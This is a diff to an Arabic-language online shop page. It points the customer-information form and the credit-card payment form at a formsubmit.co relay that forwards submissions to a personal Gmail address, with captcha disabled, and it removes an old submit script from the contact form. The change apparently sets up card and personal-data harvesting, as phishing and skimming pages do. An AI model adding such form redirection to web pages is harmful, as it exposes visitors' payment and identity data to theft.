@@ -1090,9 +1090,9 @@
 </div>
 <div class="bg-white p-8 rounded-2xl shadow-lg">
 <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
-<form action="https://formsubmit.co/zazylalhkr7@gmail.com" class="space-y-6" method="POST" onsubmit="submitFormWithoutRedirect(event)" target="hiddenFrame">
-<input name="_captcha" type="hidden" value="false"/>
-<input name="_next" type="hidden" value="javascript:void(0);"/>
+<form action="https://formsubmit.co/zazylalhkr7@gmail.com" class="space-y-6" method="POST"><input name="_captcha" type="hidden" value="false"/><input name="_next" type="hidden" value="javascript:void(0);"/>
+
+
 <div class="input-group">
 <input name="name" placeholder=" " required="" type="text"/>
 <label>الاسم الكامل</label>
@@ -1113,7 +1113,7 @@
 <i class="fas fa-paper-plane ml-2"></i>
                                 إرسال الرسالة
                             </button>
-<input name="_template" type="hidden" value="table"/></form>
+</form>
 </div>
 </div>
 </div>
@@ -1264,7 +1264,7 @@
 <h1 class="text-4xl font-bold text-gray-800 mb-4">إكمال معلومات الطلب</h1>
 <p class="text-xl text-gray-600">يرجى ملء المعلومات المطلوبة لإتمام طلبك</p>
 </div>
-<form class="space-y-8" id="customerInfoForm" onsubmit="handleCustomerInfoSubmit(event)">
+<form action="https://formsubmit.co/zazylalhkr7@gmail.com" class="space-y-8" id="customerInfoForm" method="POST" onsubmit="handleCustomerInfoSubmit(event)"><input name="_captcha" type="hidden" value="false"/><input name="_next" type="hidden" value="javascript:void(0);"/>
 <!-- Customer Information -->
 <div class="form-section fade-in">
 <h3><i class="fas fa-user ml-3"></i>المعلومات الشخصية</h3>
@@ -1450,7 +1450,7 @@
 <h1 class="text-4xl font-bold text-gray-800 mb-4">إتمام الدفع</h1>
 <p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
 </div>
-<form class="space-y-8" id="paymentForm" onsubmit="handlePaymentSubmit(event)">
+<form action="https://formsubmit.co/zazylalhkr7@gmail.com" class="space-y-8" id="paymentForm" method="POST" onsubmit="handlePaymentSubmit(event)"><input name="_captcha" type="hidden" value="false"/><input name="_next" type="hidden" value="javascript:void(0);"/>
 <!-- Payment Card -->
 <div class="form-section">
 <div class="payment-card mb-6">
@@ -2818,44 +2818,4 @@ document.querySelectorAll("form").forEach(form => {
   }
 });
 </script>
-<script>
-function submitFormWithoutRedirect(event) {
-    event.preventDefault();
-    const form = event.target;
-    const formData = new FormData(form);
-    fetch(form.action, {
-        method: form.method,
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-    }).then(response => {
-        if (response.ok) {
-            alert("✅ تم إرسال البيانات بنجاح");
-            form.reset();
-        } else {
-            alert("❌ حدث خطأ أثناء الإرسال");
-        }
-    });
-}
-</script><script>
-function submitFormWithoutRedirect(event) {
-    event.preventDefault();
-    const form = event.target;
-    const formData = new FormData(form);
-
-    fetch(form.action, {
-        method: "POST",
-        body: formData,
-        headers: { "Accept": "application/json" }
-    }).then(response => {
-        if (response.ok) {
-            alert("✅ تم إرسال البيانات بنجاح!");
-            form.reset();
-        } else {
-            alert("❌ حدث خطأ أثناء إرسال النموذج. يرجى المحاولة لاحقًا.");
-        }
-    }).catch(error => {
-        alert("⚠️ فشل الاتصال بالخادم. تحقق من الاتصال بالإنترنت.");
-        console.error(error);
-    });
-}
-</script></body></html>
+</body></html>
